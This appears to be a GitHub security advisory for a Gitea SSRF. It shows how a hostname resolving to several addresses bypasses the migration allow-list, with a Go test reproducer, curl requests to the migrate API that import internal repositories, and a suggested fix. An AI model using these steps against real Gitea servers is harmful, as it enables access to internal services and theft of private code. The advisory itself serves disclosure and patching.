# [M] Gitea: Repository migration SSRF via multi-answer DNS allow-list bypass

## Summary
Severity: Medium
Advisory: GHSA-h2x6-g7q6-344v
CVE: CVE-2026-58442
CWE: CWE-200, CWE-918
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-07-21
Source: https://github.com/advisories/GHSA-h2x6-g7q6-344v
Type: github-advisory

## Affected
- Go: `code.gitea.io/gitea` — affected >=0 <1.27.0

## Details
### Summary

Gitea's repository migration URL validation can be bypassed when a migration hostname resolves to multiple IP addresses. The validation logic accepts the destination if **any** resolved IP is allowed, even if another resolved IP is loopback, private, or otherwise blocked. The later `git clone` operation resolves the hostname again outside of that validation decision, so it can connect to the internal address.

An authenticated low-privilege user who can create repository migrations can use an attacker-controlled DNS name to make Gitea connect to internal-only Git services and import their contents into a repository controlled by the attacker.

### Details

The issue is in `services/migrations/migrate.go`, in the migration allow/block-list check.

Current logic computes whether any resolved IP is allowed:

```go
var ipAllowed bool
var ipBlocked bool
for _, addr := range addrList {
    ipAllowed = ipAllowed || allowList.MatchIPAddr(addr)
    ipBlocked = ipBlocked || blockList.MatchIPAddr(addr)
}
```

Then, when an allow-list is active, the host is accepted if the hostname matches or `ipAllowed` is true:

```go
if !allowList.IsEmpty() {
    if !allowList.MatchHostName(hostName) && !ipAllowed {
        return &git.ErrInvalidCloneAddr{Host: hostName, IsPermissionDenied: true}
    }
}
```

This means a hostname resolving to both:

- an allowed public IP, e.g. `1.2.3.4`
- a blocked internal IP, e.g. `127.0.0.1`

passes validation because the public IP sets `ipAllowed = true`.

The actual repository import is later performed by `git clone --mirror` via `MigrateRepositoryGitData` / `gitrepo.CloneExternalRepo`. That git subprocess performs its own DNS resolution and is not tied to the specific IP set that was validated earlier. If the hostname resolves, rotates, or is re-bound to the internal address at clone time, Gitea can connect to a destination the migration filter would reject if supplied directly.

The direct internal URL is correctly blocked, but the multi-answer hostname is accepted.

### PoC

I verified the vulnerable predicate locally against Gitea checkout:

```text
e8654c7e062431a521636703f47339cde64644fd
```

using Dockerized Go tests with `golang:1.26.4`.

The local test proves:

- `checkByAllowBlockList("loopback.example.test", [127.0.0.1])` is rejected.
- `checkByAllowBlockList("mixed.example.test", [1.2.3.4, 127.0.0.1])` is accepted.

Minimal reproducer at the validation layer:

```go
func TestMigrationMultiAnswerAnyAllowed(t *testing.T) {
    old := setting.Migrations
    t.Cleanup(func() { setting.Migrations = old })

    setting.Migrations.AllowedDomains = ""
    setting.Migrations.BlockedDomains = ""
    setting.Migrations.AllowLocalNetworks = false
    require.NoError(t, Init())

    err := checkByAllowBlockList("mixed.example.test", []net.IP{
        net.ParseIP("1.2.3.4"),
        net.ParseIP("127.0.0.1"),
    })
    require.NoError(t, err, "mixed public+loopback answers should currently pass")

    err = checkByAllowBlockList("loopback.example.test", []net.IP{
        net.ParseIP("127.0.0.1"),
    })
    require.Error(t, err, "loopback-only answer should be rejected")
}
```

To reproduce end-to-end:

1. Run Gitea with repository migration enabled and `ALLOW_LOCALNETWORKS = false`.
2. Create a normal non-admin user that can create repositories.
3. Run an internal Git HTTP service reachable only from the Gitea server, for example on `127.0.0.1:18082`.
4. Configure an attacker-controlled hostname so that DNS can return both a public address and `127.0.0.1`, or can return a public address during Gitea's pre-flight validation and `127.0.0.1` during the later git clone.
5. Confirm the direct internal migration is rejected:

```bash
curl -X POST http://GITEA/api/v1/repos/migrate \
  -H "Authorization: token USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "clone_addr": "http://127.0.0.1:18082/repo.git",
    "repo_name": "direct-internal",
    "service": "git",
    "private": true
  }'
```

Expected direct result:

```json
{"message":"You can not import from disallowed hosts."}
```

6. Start a migration from the attacker-controlled multi-answer hostname:

```bash
curl -X POST http://GITEA/api/v1/repos/migrate \
  -H "Authorization: token USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "clone_addr": "http://mixed.example.test:18082/repo.git",
    "repo_name": "multidns-ssrf",
    "service": "git",
    "private": true
  }'
```

Expected vulnerable result:

- The migration request is accepted.
- The git subprocess can connect to the internal address.
- Internal repository contents are imported into the attacker's new Gitea repository.

### Impact

This is a server-side request forgery in repository migration.

An authenticated user with permission to create repository migrations can make the Gitea server connect to internal-only network resources that are normally blocked by the migration SSRF filter. If the internal service is a Git repository or Git-compatible HTTP endpoint, its contents can be imported into an attacker-controlled repository and exfiltrated.

Potentially impacted resources include:

- internal Git repositories
- localhost-only services
- private network source-control services
- metadata or internal infrastructure endpoints if reachable and compatible with the request path

The direct internal destination is rejected, but a multi-answer or rebindable DNS name can pass validation and later resolve to the internal address during the clone operation.

### Suggested fix

The migration allow/block-list check should fail closed for multi-answer DNS:

- reject if **any** resolved IP is blocked
- require **all** resolved IPs to be allowed when an allow-list is active
- treat an empty resolution result as not IP-allowed
- ideally enforce the same destination policy at connection time, not only during pre-flight validation, to avoid DNS TOCTOU between validation and `git clone`

For example, instead of `ipAllowed = ipAllowed || allowList.MatchIPAddr(addr)`, initialize `ipAllowed` to `len(addrList) > 0` and combine with logical AND:

```go
ipAllowed := len(addrList) > 0
ipBlocked := false
for _, addr := range addrList {
    ipAllowed = ipAllowed && allowList.MatchIPAddr(addr)
    ipBlocked = ipBlocked || blockList.MatchIPAddr(addr)
}
```

## References
- https://github.com/go-gitea/gitea/security/advisories/GHSA-h2x6-g7q6-344v
- https://github.com/go-gitea/gitea
- https://github.com/go-gitea/gitea/releases/tag/v1.27.0
